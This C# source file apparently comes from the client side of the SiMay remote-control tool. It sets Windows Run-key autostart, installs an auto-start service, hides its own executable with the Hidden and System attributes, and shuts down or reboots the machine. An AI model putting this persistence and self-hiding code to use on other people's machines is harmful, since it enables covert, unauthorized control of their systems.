using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace SiMay.Platform.Windows
{
    public class SystemSessionHelper
    {
        /// <summary>
        /// 设置自启动
        /// </summary>
        /// <param name="isRun"></param>
        public static void SetAutoRun(bool isRun)
        {
            try
            {
                RegistryKey keys;

                //win8~10启动键位于currenUser内
                if ((Environment.OSVersion.Version.Major == 6 && Environment.OSVersion.Version.Minor == 2)
                    || (Environment.OSVersion.Version.Major == 10 && Environment.OSVersion.Version.Minor == 0))
                {
                    keys = Registry.CurrentUser;
                }
                else
                    keys = Registry.LocalMachine;

                if (isRun)
                {
                    RegistryKey key = keys.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVerSion\\Run", true);
                    if (key != null) key.SetValue("SiMayServiceEx", Application.ExecutablePath);
                }
                else
                {
                    RegistryKey key = keys.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVerSion\\Run", true);
                    if (key != null) key.DeleteValue("SiMayServiceEx");
                }
            }
            catch
            {

            }
        }

        /// <summary>
        /// 退出
        /// </summary>
        public static void UnInstall()
        {
            Environment.Exit(0);
        }

        /// <summary>
        /// 设置文件隐藏状态
        /// </summary>
        /// <param name="isHide"></param>
        public static void FileHide(bool isHide)
        {
            try
            {
                if (isHide)
                    File.SetAttributes(Application.ExecutablePath,
                    FileAttributes.Hidden | FileAttributes.System);
                else
                    File.SetAttributes(Application.ExecutablePath, ~FileAttributes.Hidden);
            }
            catch { }
        }

        /// <summary>
        /// 系统关机
        /// </summary>
        public static void Shutdown()
        {
            Process.Start("cmd.exe", "/c shutdown -s -t 0");
        }

        /// <summary>
        /// 系统重启
        /// </summary>
        public static void Reboot()
        {
            Process.Start("cmd.exe", "/c shutdown -r -t 0");
        }

        public static bool InstallAutoStartService(string serviceName, string displayName)
        {
            var svcFullName = Assembly.GetExecutingAssembly().Location;
            var parameter = " \"-serviceStart\"";//服务启动标志
            svcFullName += parameter;

            return ServiceInstallerHelper.InstallService(svcFullName, serviceName, displayName);
            //if ()
            //{
            //    SystemMessageNotify.ShowTip("SiMay远程控制被控服务安装完成!");
            //    //服务安装完成启动成功
            //    Environment.Exit(0);
            //}
            //else
            //{
            //    SystemMessageNotify.ShowTip("SiMay远程控制被控服务安装失败!");
            //    LogHelper.DebugWriteLog("Service Install Not Completed!!");
            //}
        }

        public static bool UnInstallAutoStartService(string serviceName)
        {
            //SystemMessageNotify.ShowTip("SiMay远程控制被控服务正在卸载服务!");

            return ServiceInstallerHelper.UnInstallService(serviceName);
            //if (ServiceInstallerHelper.UnInstallService(serviceName))
            //    Environment.Exit(0);
            //else
            //{
            //    SystemMessageNotify.ShowTip("SiMay远程控制被控服务卸载失败!");
            //    LogHelper.DebugWriteLog("Service UnInstall Not Completed!!");
            //}
        }
    }
}
